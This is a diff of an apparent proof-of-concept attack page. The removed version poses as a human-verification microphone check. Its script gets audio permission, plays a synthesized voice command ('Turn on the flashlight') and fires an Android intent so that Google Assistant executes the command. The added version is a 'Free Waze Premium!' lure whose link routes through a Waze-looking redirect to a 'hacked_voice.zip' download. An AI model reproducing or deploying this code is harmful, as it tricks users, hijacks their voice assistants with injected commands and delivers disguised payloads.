@@ -1,50 +1,6 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>Audio Verification</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #111; color: white; text-align: center; }
-        button { padding: 20px 40px; font-size: 20px; background: #ea4335; color: white; border: none; border-radius: 8px; cursor: pointer; }
-    </style>
-</head>
 <body>
-    <div>
-        <h2>Microphone Check</h2>
-        <p>Please allow microphone access to verify you are human.</p>
-        <button id="btn">Start Verification</button>
-    </div>
-
-    <script>
-        document.getElementById('btn').addEventListener('click', async function() {
-            try {
-                // 1. The Bypass: Request Microphone access to force Chrome into a high-priority audio state
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                
-                // 2. Unlock TTS
-                window.speechSynthesis.speak(new SpeechSynthesisUtterance(""));
-
-                // 3. Queue the Acoustic Payload
-                setTimeout(() => {
-                    let msg = new SpeechSynthesisUtterance("Turn on the flashlight");
-                    msg.lang = 'en-US';
-                    msg.rate = 1.3;
-                    window.speechSynthesis.speak(msg);
-                }, 500);
-
-                // 4. Fire the Intent
-                let intentUrl = "intent://assistant.google.com/services/invoke/document#Intent;" +
-                    "scheme=https;" +
-                    "package=com.google.android.googlequicksearchbox;" +
-                    "action=android.intent.action.VIEW;" +
-                    "end";
-                
-                window.location.href = intentUrl;
-
-            } catch (err) {
-                alert("You must allow microphone access to verify.");
-            }
-        });
-    </script>
+    <h1>Free Waze Premium!</h1>
+    <a href="https://www.gcp.wazestg.com/ul?acvp=https://linux-1723.github.io/test/hacked_voice.zip">Click here to claim</a>
 </body>
 </html>
